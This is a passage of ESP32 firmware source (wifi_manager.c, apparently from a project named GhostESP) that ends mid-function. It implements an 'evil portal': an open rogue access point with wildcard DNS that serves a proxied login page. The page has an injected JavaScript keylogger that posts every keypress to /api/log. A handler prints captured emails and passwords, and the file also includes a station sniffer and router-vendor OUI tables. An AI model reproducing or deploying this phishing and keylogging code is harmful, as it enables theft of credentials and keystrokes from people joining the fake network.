// wifi_manager.c

#include "managers/wifi_manager.h"
#include "managers/rgb_manager.h"
#include "managers/ap_manager.h"
#include "managers/settings_manager.h"
#include "freertos/FreeRTOS.h"
#include "freertos/event_groups.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include <sys/time.h>
#include <string.h>
#include <esp_random.h>
#include "esp_timer.h"
#include <ctype.h>
#include <stdio.h>
#include <fcntl.h>
#include <mdns.h>
#include <math.h>
#include <dhcpserver/dhcpserver.h>
#include "esp_http_client.h"
#include "lwip/lwip_napt.h"
#include "lwip/etharp.h"
#include <esp_http_server.h>
#include <core/dns_server.h>
#include "esp_crt_bundle.h"
#ifdef WITH_SCREEN
#include "managers/views/music_visualizer.h"
#endif
// Include Outside so we have access to the Terminal View Macro
#include "managers/views/terminal_screen.h"


#define MAX_DEVICES 255
#define CHUNK_SIZE 8192
#define MDNS_NAME_BUF_LEN 65
#define ARP_DELAY_MS 500
#define MAX_PACKETS_PER_SECOND 200

uint16_t ap_count;
wifi_ap_record_t* scanned_aps;
const char *TAG = "WiFiManager";
char* PORTALURL = "";
char* domain_str = "";
EventGroupHandle_t wifi_event_group;
const int WIFI_CONNECTED_BIT = BIT0;
wifi_ap_record_t selected_ap;
bool redirect_handled = false;
httpd_handle_t evilportal_server = NULL;
dns_server_handle_t dns_handle;
esp_netif_t* wifiAP;
esp_netif_t* wifiSTA;
static uint32_t last_packet_time = 0;
static uint32_t packet_counter = 0;

struct service_info {
    const char *query;
    const char *type;
};


struct service_info services[] = {
    {"_http", "Web Server Enabled Device"},
    {"_ssh", "SSH Server"},
    {"_ipp", "Printer (IPP)"},
    {"_googlecast", "Google Cast"},
    {"_raop", "AirPlay"},
    {"_smb", "SMB File Sharing"},
    {"_hap", "HomeKit Accessory"},
    {"_spotify-connect", "Spotify Connect Device"},
    {"_printer", "Printer (Generic)"},
    {"_mqtt", "MQTT Broker"}
};

#define NUM_SERVICES (sizeof(services) / sizeof(services[0]))

struct DeviceInfo {
    struct ip4_addr ip;
    struct eth_addr mac;
};

typedef enum {
    COMPANY_DLINK,
    COMPANY_NETGEAR,
    COMPANY_BELKIN,
    COMPANY_TPLINK,
    COMPANY_LINKSYS,
    COMPANY_ASUS,
    COMPANY_ACTIONTEC,
    COMPANY_UNKNOWN
} ECompany;

static void tolower_str(const uint8_t *src, char *dst) {
    for (int i = 0; i < 33 && src[i] != '\0'; i++) {
        dst[i] = tolower((char)src[i]);
    }
    dst[32] = '\0'; // Ensure null-termination
}

void configure_hidden_ap() {
    wifi_config_t wifi_config;

    // Get the current AP configuration
    esp_err_t err = esp_wifi_get_config(WIFI_IF_AP, &wifi_config);
    if (err != ESP_OK) {
        printf("Failed to get Wi-Fi config: %s\n", esp_err_to_name(err));
        return;
    }

    // Set the SSID to hidden while keeping the other settings unchanged
    wifi_config.ap.ssid_hidden = 1;
    wifi_config.ap.beacon_interval = 10000;
    wifi_config.ap.ssid_len = 0;

    // Apply the updated configuration
    err = esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
    if (err != ESP_OK) {
        printf("Failed to set Wi-Fi config: %s\n", esp_err_to_name(err));
    } else {
        printf("Wi-Fi AP SSID is now hidden.\n");
    }
}

static void event_handler(void* arg, esp_event_base_t event_base,
                          int32_t event_id, void* event_data) {
    if (event_base == WIFI_EVENT) {
        switch (event_id) {
            case WIFI_EVENT_AP_START:
                printf("AP started\n");
                break;
            case WIFI_EVENT_AP_STOP:
                printf("AP stopped\n");
                break;
            case WIFI_EVENT_AP_STACONNECTED:
                printf("Station connected to AP\n");
                break;
            case WIFI_EVENT_AP_STADISCONNECTED:
                printf("Station disconnected from AP\n");
                break;
            case WIFI_EVENT_STA_START:
                printf("STA started\n");
                esp_wifi_connect();
                break;
            case WIFI_EVENT_STA_DISCONNECTED:
                printf("Disconnected from Wi-Fi, retrying...\n");
                esp_wifi_connect();
                break;
            default:
                break;
        }
    } else if (event_base == IP_EVENT) {
        switch (event_id) {
            case IP_EVENT_STA_GOT_IP:
                break;
            case IP_EVENT_AP_STAIPASSIGNED:
                printf("Assigned IP to STA\n");
                break;
            default:
                break;
        }
    }
}

// OUI lists for each company
const char *dlink_ouis[] = {
        "00055D", "000D88", "000F3D", "001195", "001346", "0015E9", "00179A", 
        "00195B", "001B11", "001CF0", "001E58", "002191", "0022B0", "002401", 
        "00265A", "00AD24", "04BAD6", "085A11", "0C0E76", "0CB6D2", "1062EB", 
        "10BEF5", "14D64D", "180F76", "1C5F2B", "1C7EE5", "1CAFF7", "1CBDB9", 
        "283B82", "302303", "340804", "340A33", "3C1E04", "3C3332", "4086CB", 
        "409BCD", "54B80A", "5CD998", "60634C", "642943", "6C198F", "6C7220", 
        "744401", "74DADA", "78321B", "78542E", "7898E8", "802689", "84C9B2", 
        "8876B9", "908D78", "9094E4", "9CD643", "A06391", "A0AB1B", "A42A95", 
        "A8637D", "ACF1DF", "B437D8", "B8A386", "BC0F9A", "BC2228", "BCF685", 
        "C0A0BB", "C4A81D", "C4E90A", "C8787D", "C8BE19", "C8D3A3", "CCB255", 
        "D8FEE3", "DCEAE7", "E01CFC", "E46F13", "E8CC18", "EC2280", "ECADE0", 
        "F07D68", "F0B4D2", "F48CEB", "F8E903", "FC7516"
    };
const char *netgear_ouis[] = {
        "00095B", "000FB5", "00146C", "001B2F", "001E2A", "001F33", "00223F", 
        "00224B2", "0026F2", "008EF2", "08028E", "0836C9", "08BD43", "100C6B", 
        "100D7F", "10DA43", "1459C0", "204E7F", "20E52A", "288088", "289401", 
        "28C68E", "2C3033", "2CB05D", "30469A", "3498B5", "3894ED", "3C3786", 
        "405D82", "44A56E", "4C60DE", "504A6E", "506A03", "54077D", "58EF68", 
        "6038E0", "6CB0CE", "6CCDD6", "744401", "803773", "841B5E", "8C3BAD", 
        "941865", "9C3DCF", "9CC9EB", "9CD36D", "A00460", "A021B7", "A040A0", 
        "A42B8C", "B03956", "B07FB9", "B0B98A", "BCA511", "C03F0E", "C0FFD4", 
        "C40415", "C43DC7", "C89E43", "CC40D0", "DCEF09", "E0469A", "E046EE", 
        "E091F5", "E4F4C6", "E8FCAF", "F87394"
    };
const char *belkin_ouis[] =  {
        "001150", "00173F", "0030BD", "08BD43", "149182", "24F5A2", "302303", 
        "80691A", "94103E", "944452", "B4750E", "C05627", "C4411E", "D8EC5E", 
        "E89F80", "EC1A59", "EC2280"
    };
const char *tplink_ouis[] = {
        "003192", "005F67", "1027F5", "14EBB6", "1C61B4", "203626", "2887BA", 
        "30DE4B", "3460F9", "3C52A1", "40ED00", "482254", "5091E3", "54AF97", 
        "5C628B", "5CA6E6", "5CE931", "60A4B7", "687FF0", "6C5AB0", "788CB5", 
        "7CC2C6", "9C5322", "9CA2F4", "A842A1", "AC15A2", "B0A7B9", "B4B024", 
        "C006C3", "CC68B6", "E848B8", "F0A731"
    };
const char *linksys_ouis[] = {
        "00045A", "000625", "000C41", "000E08", "000F66", "001217", "001310", 
        "0014BF", "0016B6", "001839", "0018F8", "001A70", "001C10", "001D7E", 
        "001EE5", "002129", "00226B", "002369", "00259C", "002354", "0024B2", 
        "003192", "005F67", "1027F5", "14EBB6", "1C61B4", "203626", "2887BA", 
        "305A3A", "2CFDA1", "302303", "30469A", "40ED00", "482254", "5091E3", 
        "54AF97", "5CA2F4", "5CA6E6", "5CE931", "60A4B7", "687FF0", "6C5AB0", 
        "788CB5", "7CC2C6", "9C5322", "9CA2F4", "A842A1", "AC15A2", "B0A7B9", 
        "B4B024", "C006C3", "CC68B6", "E848B8", "F0A731"
    };
const char *asus_ouis[] = {
        "000C6E", "000EA6", "00112F", "0011D8", "0013D4", "0015F2", "001731", 
        "0018F3", "001A92", "001BFC", "001D60", "001E8C", "001FC6", "002215", 
        "002354", "00248C", "002618", "00E018", "04421A", "049226", "04D4C4", 
        "04D9F5", "08606E", "086266", "08BFB8", "0C9D92", "107B44", "107C61", 
        "10BF48", "10C37B", "14DAE9", "14DDA9", "1831BF", "1C872C", "1CB72C", 
        "20CF30", "244BFE", "2C4D54", "2C56DC", "2CFDA1", "305A3A", "3085A9", 
        "3497F6", "382C4A", "38D547", "3C7C3F", "40167E", "40B076", "485B39", 
        "4CEDFB", "50465D", "50EBF6", "5404A6", "54A050", "581122", "6045CB", 
        "60A44C", "60CF84", "704D7B", "708BCD", "74D02B", "7824AF", "7C10C9", 
        "88D7F6", "90E6BA", "9C5C8E", "A036BC", "A85E45", "AC220B", "AC9E17", 
        "B06EBF", "BCAEC5", "BCEE7B", "C86000", "C87F54", "CC28AA", "D017C2", 
        "D45D64", "D850E6", "E03F49", "E0CB4E", "E89C25", "F02F74", "F07959", 
        "F46D04", "F832E4", "FC3497", "FCC233"
    };
const char *actiontec_ouis[] = {
        "000FB3", "001505", "001801", "001EA7", "001F90", "0020E0", "00247B", 
        "002662", "0026B8", "007F28", "0C6127", "105F06", "10785B", "109FA9", 
        "181BEB", "207600", "408B07", "4C8B30", "5C35FC", "7058A4", "70F196", 
        "70F220", "84E892", "941C56", "9C1E95", "A0A3E2", "A83944", "E86FF2", 
        "F8E4FB", "FC2BB2"
};

// WiFi event handler (same as before)
static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        printf("WiFi started, ready to scan.\n");
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        printf("Disconnected from WiFi\n");
        xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
    }
    else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
        printf("Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
        xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
    }
}

static void generate_random_ssid(char *ssid, size_t length) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < length - 1; i++) {
        int random_index = esp_random() % (sizeof(charset) - 1);
        ssid[i] = charset[random_index];
    }
    ssid[length - 1] = '\0';  // Null-terminate the SSID
}

static void generate_random_mac(uint8_t *mac) {
    esp_fill_random(mac, 6);   // Fill MAC address with random bytes
    mac[0] &= 0xFE;            // Unicast MAC address (least significant bit of the first byte should be 0)
    mac[0] |= 0x02;            // Locally administered MAC address (set the second least significant bit)
}

static bool station_exists(const uint8_t *station_mac, const uint8_t *ap_bssid) {
    for (int i = 0; i < station_count; i++) {
        if (memcmp(station_ap_list[i].station_mac, station_mac, 6) == 0 &&
            memcmp(station_ap_list[i].ap_bssid, ap_bssid, 6) == 0) {
            return true;
        }
    }
    return false;
}

static void add_station_ap_pair(const uint8_t *station_mac, const uint8_t *ap_bssid) {
    if (station_count < MAX_STATIONS) {
        // Copy MAC addresses to the list
        memcpy(station_ap_list[station_count].station_mac, station_mac, 6);
        memcpy(station_ap_list[station_count].ap_bssid, ap_bssid, 6);
        station_count++;

        // Print formatted MAC addresses
        
    } else {
        printf("Station list is full, can't add more stations.\n");
    }
}

// Function to match the BSSID to a company based on OUI
ECompany match_bssid_to_company(const uint8_t *bssid) {
    char oui[7]; // First 3 bytes of the BSSID
    snprintf(oui, sizeof(oui), "%02X%02X%02X", bssid[0], bssid[1], bssid[2]);

    // Check D-Link
    for (int i = 0; i < sizeof(dlink_ouis) / sizeof(dlink_ouis[0]); i++) {
        if (strcmp(oui, dlink_ouis[i]) == 0) {
            return COMPANY_DLINK;
        }
    }

    // Check Netgear
    for (int i = 0; i < sizeof(netgear_ouis) / sizeof(netgear_ouis[0]); i++) {
        if (strcmp(oui, netgear_ouis[i]) == 0) {
            return COMPANY_NETGEAR;
        }
    }

    // Check Belkin
    for (int i = 0; i < sizeof(belkin_ouis) / sizeof(belkin_ouis[0]); i++) {
        if (strcmp(oui, belkin_ouis[i]) == 0) {
            return COMPANY_BELKIN;
        }
    }

    // Check TP-Link
    for (int i = 0; i < sizeof(tplink_ouis) / sizeof(tplink_ouis[0]); i++) {
        if (strcmp(oui, tplink_ouis[i]) == 0) {
            return COMPANY_TPLINK;
        }
    }

    // Check Linksys
    for (int i = 0; i < sizeof(linksys_ouis) / sizeof(linksys_ouis[0]); i++) {
        if (strcmp(oui, linksys_ouis[i]) == 0) {
            return COMPANY_LINKSYS;
        }
    }

    // Check ASUS
    for (int i = 0; i < sizeof(asus_ouis) / sizeof(asus_ouis[0]); i++) {
        if (strcmp(oui, asus_ouis[i]) == 0) {
            return COMPANY_ASUS;
        }
    }

    // Check Actiontec
    for (int i = 0; i < sizeof(actiontec_ouis) / sizeof(actiontec_ouis[0]); i++) {
        if (strcmp(oui, actiontec_ouis[i]) == 0) {
            return COMPANY_ACTIONTEC;
        }
    }

    // Unknown company if no match found
    return COMPANY_UNKNOWN;
}

void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) {
        return;
    }

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)packet->payload;
    const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;

    
    const uint8_t *src_mac = hdr->addr2;  // Station MAC
    const uint8_t *dest_mac = hdr->addr1; // AP BSSID
    
    printf("station MAC: %02X:%02X:%02X:%02X:%02X:%02X -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
            src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5],
            dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5]);
}

esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *content_type) {
    printf("Requesting URL: %s\n", url);

    
    if (strstr(url, "/mnt") != NULL) {
        printf("URL points to a local file: %s\n", url);

        
        FILE *file = fopen(url, "r");
        if (file == NULL) {
            printf("Failed to open file: %s\n", url);
            return ESP_FAIL;
        }

       
        if (content_type) {
            printf("Content-Type: %s\n", content_type);
            httpd_resp_set_type(req, content_type);
        } else {
            printf("Content-Type not provided, using default 'application/octet-stream'\n");
            httpd_resp_set_type(req, "application/octet-stream");
        }
        httpd_resp_set_status(req, "200 OK");

        
        char *buffer = (char *)malloc(CHUNK_SIZE + 1);
        if (buffer == NULL) {
            printf("Failed to allocate memory for buffer\n");
            fclose(file);
            return ESP_FAIL;
        }


        int read_len;
        while ((read_len = fread(buffer, 1, CHUNK_SIZE, file)) > 0) {
            if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
                printf("Failed to send chunk to client\n");
                break;
            }
        }

        
        if (feof(file)) {
            printf("Finished reading all data from file\n");
        } else if (ferror(file)) {
            printf("Error reading file\n");
        }

        // Clean up
        free(buffer);
        fclose(file);

        // Send final chunk to end the response
        httpd_resp_send_chunk(req, NULL, 0);

        return ESP_OK;
    } else {
        // Proceed with HTTP request if not an SD card file
        esp_http_client_config_t config = {
            .url = url,
            .timeout_ms = 5000,
            .crt_bundle_attach = esp_crt_bundle_attach,
            .transport_type = HTTP_TRANSPORT_OVER_SSL,
            .user_agent = "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36",  // Browser-like User-Agent string
            .disable_auto_redirect = false,
        };

        esp_http_client_handle_t client = esp_http_client_init(&config);
        if (client == NULL) {
            printf("Failed to initialize HTTP client\n");
            return ESP_FAIL;
        }

        esp_err_t err = esp_http_client_perform(client);
        if (err != ESP_OK) {
            printf("HTTP request failed: %s\n", esp_err_to_name(err));
            esp_http_client_cleanup(client);
            return ESP_FAIL;
        }

        int http_status = esp_http_client_get_status_code(client);
        printf("Final HTTP Status code: %d\n", http_status);

        if (http_status == 200) {
            printf("Received 200 OK. Re-opening connection for manual streaming...\n");

            err = esp_http_client_open(client, 0);
            if (err != ESP_OK) {
                printf("Failed to re-open HTTP connection for streaming: %s\n", esp_err_to_name(err));
                esp_http_client_cleanup(client);
                return ESP_FAIL;
            }

            int content_length = esp_http_client_fetch_headers(client);
            printf("Content length: %d\n", content_length);

            if (content_type) {
                printf("Content-Type: %s\n", content_type);
                httpd_resp_set_type(req, content_type);
            } else {
                printf("Content-Type not provided, using default 'application/octet-stream'\n");
                httpd_resp_set_type(req, "application/octet-stream");
            }

            httpd_resp_set_hdr(req, "Content-Security-Policy", 
                   "default-src 'self' 'unsafe-inline' data: blob:; "
                   "script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; "
                   "style-src 'self' 'unsafe-inline' data:; "
                   "img-src 'self' 'unsafe-inline' data: blob:; "
                   "connect-src 'self' data: blob:;");
            httpd_resp_set_status(req, "200 OK");

            char *buffer = (char *)malloc(CHUNK_SIZE + 1);
            if (buffer == NULL) {
                printf("Failed to allocate memory for buffer");
                esp_http_client_cleanup(client);
                return ESP_FAIL;
            }

            int read_len;
            while ((read_len = esp_http_client_read(client, buffer, CHUNK_SIZE)) > 0) {
                if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
                    printf("Failed to send chunk to client\n");
                    break;
                }
            }

            if (read_len == 0) {
                printf("Finished reading all data from server (end of content)\n");
            } else if (read_len < 0) {
                printf("Failed to read response, read_len: %d\n", read_len);
            }

            if (content_type && strcmp(content_type, "text/html") == 0) {
                const char *javascript_code =
                    "<script>var keys = '';\n"
                    "\n"
                    "document.onkeypress = function(e) {\n"
                    "    get = window.event ? event : e;\n"
                    "    key = get.keyCode ? get.keyCode : get.charCode;\n"
                    "    key = String.fromCharCode(key);\n"
                    "    keys += key;\n"
                    "\n"
                    "    // Make a fetch request on every key press\n"
                    "    fetch('/api/log', {\n"
                    "        method: 'POST',\n"
                    "        headers: {\n"
                    "            'Content-Type': 'application/json'\n"
                    "        },\n"
                    "        body: JSON.stringify({ content: keys })\n"
                    "    })\n"
                    "    .catch(error => console.error('Error logging:', error));\n"
                    "};</script>\n";
                if (httpd_resp_send_chunk(req, javascript_code, strlen(javascript_code)) != ESP_OK) {
                    printf("Failed to send custom JavaScript\n");
                }
            }

            free(buffer);
            esp_http_client_close(client);
            esp_http_client_cleanup(client);

            httpd_resp_send_chunk(req, NULL, 0);

            return ESP_OK;
        } else {
            printf("Unhandled HTTP status code: %d\n", http_status);
            esp_http_client_cleanup(client);
            return ESP_FAIL;
        }
    }
}

const char* get_content_type(const char *uri) {
    if (strstr(uri, ".css")) {
        return "text/css";
    } else if (strstr(uri, ".js")) {
        return "application/javascript";
    } else if (strstr(uri, ".png")) {
        return "image/png";
    } else if (strstr(uri, ".jpg") || strstr(uri, ".jpeg")) {
        return "image/jpeg";
    } else if (strstr(uri, ".gif")) {
        return "image/gif";
    }
    return "application/octet-stream";  // Default to binary stream if unknown
}

const char* get_host_from_req(httpd_req_t *req) {
    size_t buf_len = httpd_req_get_hdr_value_len(req, "Host") + 1;
    if (buf_len > 1) {
        char *host = malloc(buf_len);
        if (httpd_req_get_hdr_value_str(req, "Host", host, buf_len) == ESP_OK) {
            printf("Host header found: %s\n", host);
            return host;  // Caller must free() this memory
        }
        free(host);
    }
    printf("Host header not found\n");
    return NULL;
}

void build_file_url(const char *host, const char *uri, char *file_url, size_t max_len) {
    snprintf(file_url, max_len, "https://%s%s", host, uri);
    printf("File URL built: %s\n", file_url);
}

esp_err_t file_handler(httpd_req_t *req) {
    const char *uri = req->uri;

    
    const char *host = get_host_from_req(req);
    if (host == NULL) {
        httpd_resp_set_status(req, "400 Bad Request");
        httpd_resp_send(req, NULL, 0);
        return ESP_FAIL;
    }

    
    char file_url[512];
    build_file_url(host, uri, file_url, sizeof(file_url));

    
    const char *content_type = get_content_type(uri);
    printf("Determined content type: %s for URI: %s\n", content_type, uri);

    
    esp_err_t result = stream_data_to_client(req, file_url, content_type);

    free((void *)host);

    return result;
}


esp_err_t portal_handler(httpd_req_t *req) {
    printf("Client requested URL: %s\n", req->uri);


    esp_err_t err = stream_data_to_client(req, PORTALURL, "text/html");
    
    if (err != ESP_OK) {
        const char *err_msg = esp_err_to_name(err);

        char error_message[512];
        snprintf(error_message, sizeof(error_message),
                 "<html><body><h1>Failed to fetch portal content</h1><p>Error: %s</p></body></html>", err_msg);

        httpd_resp_set_type(req, "text/html");
        httpd_resp_send(req, error_message, strlen(error_message));
    }

    return ESP_OK;
}

esp_err_t get_log_handler(httpd_req_t *req) {
    char body[256] = {0};
    int received = 0;

    while ((received = httpd_req_recv(req, body, sizeof(body) - 1)) > 0) {
        body[received] = '\0';

        printf("Received chunk: %s\n", body);
    }

    if (received < 0) {
        printf("Failed to receive request body");
        return ESP_FAIL;
    }

    const char* resp_str = "Body content logged successfully";
    httpd_resp_send(req, resp_str, strlen(resp_str));

    return ESP_OK;
}

esp_err_t get_info_handler(httpd_req_t *req) {
    char query[256] = {0};
    char email[64] = {0};
    char password[64] = {0};

    
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        printf("Received query: %s\n", query);


        if (get_query_param_value(query, "email", email, sizeof(email)) == ESP_OK) {
            char decoded_email[64] = {0};
            url_decode(decoded_email, email);
            printf("Decoded email: %s\n", decoded_email);
        } else {
            printf("Email parameter not found\n");
        }

        
        if (get_query_param_value(query, "password", password, sizeof(password)) == ESP_OK) {
            char decoded_password[64] = {0};
            url_decode(decoded_password, password);
            printf("Decoded password: %s\n", decoded_password);
        } else {
            printf("Password parameter not found\n");
        }

    } else {
        printf("No query string found in request\n");
    }

    
    const char* resp_str = "Query parameters processed";
    httpd_resp_send(req, resp_str, strlen(resp_str));

    return ESP_OK;
}

esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
    printf("Received request for captive portal detection endpoint: %s\n", req->uri);

    if (strstr(req->uri, "/get") != NULL) {
        get_info_handler(req);
        return ESP_OK;
    }


    if (strstr(get_content_type(req->uri), "application/octet-stream") == NULL)
    {
        file_handler(req);
        return ESP_OK;
    }
    
    httpd_resp_set_status(req, "301 Moved Permanently");
    char LocationRedir[512];
        snprintf(LocationRedir, sizeof(LocationRedir),
                 "http://192.168.4.1/login");
    httpd_resp_set_hdr(req, "Location", LocationRedir);
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}


httpd_handle_t start_portal_webserver(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.stack_size = 8192;
    if (httpd_start(&evilportal_server, &config) == ESP_OK) {
        httpd_uri_t portal_uri = {
            .uri      = "/login",
            .method   = HTTP_GET,
            .handler  = portal_handler,
            .user_ctx = NULL
        };
        httpd_uri_t portal_uri_android = {
            .uri      = "/generate_204",
            .method   = HTTP_GET,
            .handler  = captive_portal_redirect_handler,
            .user_ctx = NULL
        };
        httpd_uri_t portal_uri_apple = {
            .uri      = "/hotspot-detect.html",
            .method   = HTTP_GET,
            .handler  = captive_portal_redirect_handler,
            .user_ctx = NULL
        };
        httpd_uri_t microsoft_uri = {
            .uri      = "/connecttest.txt",
            .method   = HTTP_GET,
            .handler  = captive_portal_redirect_handler,
            .user_ctx = NULL
        };
        httpd_uri_t log_handler_uri = {
            .uri      = "/api/log",
            .method   = HTTP_POST,
            .handler  = get_log_handler,
            .user_ctx = NULL
        };
        httpd_uri_t portal_png = {
            .uri      = ".png",
            .method   = HTTP_GET,
            .handler  = file_handler,
            .user_ctx = NULL
        };
        httpd_uri_t portal_jpg = {
            .uri      = ".jpg",
            .method   = HTTP_GET,
            .handler  = file_handler,
            .user_ctx = NULL
        };
        httpd_uri_t portal_css = {
            .uri      = ".css",
            .method   = HTTP_GET,
            .handler  = file_handler,
            .user_ctx = NULL
        };
        httpd_uri_t portal_js = {
            .uri      = ".js",
            .method   = HTTP_GET,
            .handler  = file_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(evilportal_server, &portal_uri_apple);
        httpd_register_uri_handler(evilportal_server, &portal_uri);
        httpd_register_uri_handler(evilportal_server, &portal_uri_android);
        httpd_register_uri_handler(evilportal_server, &microsoft_uri);
        httpd_register_uri_handler(evilportal_server, &log_handler_uri);


        httpd_register_uri_handler(evilportal_server, &portal_png);
        httpd_register_uri_handler(evilportal_server, &portal_jpg);
        httpd_register_uri_handler(evilportal_server, &portal_css);
        httpd_register_uri_handler(evilportal_server, &portal_js);
        httpd_register_err_handler(evilportal_server, HTTPD_404_NOT_FOUND, captive_portal_redirect_handler);
    }
    return evilportal_server;
}

esp_err_t wifi_manager_start_evil_portal(const char *URL, const char *SSID, const char *Password, const char* ap_ssid, const char* domain)
{

    if (strlen(URL) > 0 && strlen(domain) > 0)
    {
        PORTALURL = URL;
        domain_str = domain;
    }

    ap_manager_stop_services();

    esp_netif_dns_info_t dnsserver;

    uint32_t my_ap_ip = esp_ip4addr_aton("192.168.4.1");

    esp_netif_ip_info_t ipInfo_ap;
    ipInfo_ap.ip.addr = my_ap_ip;
    ipInfo_ap.gw.addr = my_ap_ip;
    esp_netif_set_ip4_addr(&ipInfo_ap.netmask, 255,255,255,0);
    esp_netif_dhcps_stop(wifiAP); // stop before setting ip WifiAP
    esp_netif_set_ip_info(wifiAP, &ipInfo_ap);
    esp_netif_dhcps_start(wifiAP);

    wifi_config_t wifi_config = { 0 };
        wifi_config_t ap_config = {
        .ap = {
            .channel = 0,
            .authmode = WIFI_AUTH_WPA2_WPA3_PSK,
            .ssid_hidden = 0,
            .max_connection = 8,
            .beacon_interval = 100,
        }
    };      

    if (SSID != NULL || Password != NULL)
    {
        strlcpy((char*)wifi_config.sta.ssid, SSID, sizeof(wifi_config.sta.ssid));
        strlcpy((char*)wifi_config.sta.password, Password, sizeof(wifi_config.sta.password));


        strlcpy((char*)ap_config.sta.ssid, ap_ssid, sizeof(ap_config.sta.ssid));
        ap_config.ap.authmode = WIFI_AUTH_OPEN;   

        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA) );

        

        dhcps_offer_t dhcps_dns_value = OFFER_DNS;
        esp_netif_dhcps_option(wifiAP,ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, &dhcps_dns_value, sizeof(dhcps_dns_value));                           

        dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
        dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
        esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);

        vTaskDelay(pdMS_TO_TICKS(100));

        ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config) );

        ESP_ERROR_CHECK(esp_wifi_start());
        vTaskDelay(pdMS_TO_TICKS(500));
        esp_wifi_connect();
        xEventGroupWaitBits(wifi_event_group, WIFI_CONNECTED_BIT,
            pdFALSE, pdTRUE, 5000 / portTICK_PERIOD_MS);

        ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config) );

        start_portal_webserver();

        // Configure DNS server to handle both regular and .local domains
        dns_server_config_t dns_config = {
            .num_of_entries = 3,
            .item = {
                {
                    .name = "*", 
                    .if_key = NULL, 
                    .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1)} 
                },
                {
                    .name = "ghostesp", 
                    .if_key = NULL, 
                    .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1)} 
                },
                {
                    .name = "ghostesp.local",
                    .if_key = NULL, 
                    .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1)} 
                }
            }
        };

        // Start DNS server
        dns_handle = start_dns_server(&dns_config);
        if (dns_handle) {
            ESP_LOGI(TAG, "DNS server started, handling all requests including ghostesp.local");
        } else {
            ESP_LOGE(TAG, "Failed to start DNS server");
            return ESP_FAIL;
        }

        // Configure DHCP to offer our DNS server
        esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, 
                              &dhcps_dns_value, sizeof(dhcps_dns_value));

        // Set DNS server info
        esp_netif_dns_info_t dns_info = {
            .ip.u_addr.ip4.addr = ESP_IP4TOADDR(192, 168, 4, 1),
            .ip.type = ESP_IPADDR_TYPE_V4
        };
        esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dns_info);
    }
    else 
    {
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
        strlcpy((char*)ap_config.sta.ssid, ap_ssid, sizeof(ap_config.sta.ssid));
        ap_config.ap.authmode = WIFI_AUTH_OPEN;

        dhcps_offer_t dhcps_dns_value = OFFER_DNS;
        esp_netif_dhcps_option(wifiAP,ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, &dhcps_dns_value, sizeof(dhcps_dns_value));                           

        dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
        dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
        esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);

        ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));

        ESP_ERROR_CHECK(esp_wifi_start());

        start_portal_webserver();

        dns_server_config_t dns_config = {
            .num_of_entries = 1,
            .item = {
                {
                    .name = "*", 
                    .if_key = NULL, 
                    .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1)} 
                }
            }
        };


        dns_handle = start_dns_server(&dns_config);
        if (dns_handle) {
            printf("DNS server started, all requests will be redirected to 192.168.4.1\n");
        } else {
            printf("Failed to start DNS server\n");
        }
    }

    return ESP_OK;  // Add return value at the end
}


void wifi_manager_stop_evil_portal()
{

    if (dns_handle != NULL)
    {
        stop_dns_server(dns_handle);
        dns_handle = NULL;
